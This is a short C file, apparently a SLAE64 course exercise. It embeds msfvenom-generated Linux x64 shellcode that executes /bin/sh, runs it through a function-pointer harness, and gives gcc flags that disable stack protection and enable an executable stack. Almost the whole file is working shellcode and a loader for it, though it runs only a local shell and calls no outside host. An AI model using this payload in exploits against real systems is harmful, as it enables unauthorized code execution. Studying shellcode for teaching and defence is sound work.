// Filename: shellcode3.c
// Author:  SLAE64 - 1525
//
// Shellcode: msfvenom -p linux/x64/exec --arch x64 --platform linux -f c CMD=/bin/sh

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";
void main()
{
    printf("Shellcode Length: %d\n", (int) strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

// Compile with:
// gcc -fno-stack-protector -z execstack shellcode3.c -o shellcode3